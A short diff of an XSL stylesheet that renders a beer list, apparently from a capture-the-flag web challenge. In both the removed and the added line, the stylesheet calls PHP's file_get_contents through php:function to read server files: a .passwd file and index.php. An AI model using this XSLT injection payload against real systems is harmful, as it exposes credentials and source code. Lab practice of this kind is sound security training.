@@ -4,7 +4,7 @@
 <xsl:for-each select="beers/beer">
 <div style="background-color:teal;color:white;padding:4px">
 <span style="font-weight:bold">
-<xsl:value-of select="php:function('file_get_contents','/challenge/web-serveur/ch50/.passwd')"/>
+<xsl:value-of select="php:function('file_get_contents','/challenge/web-serveur/ch50/index.php')"/>
 - 
 </span>
 <xsl:value-of select="price"/>
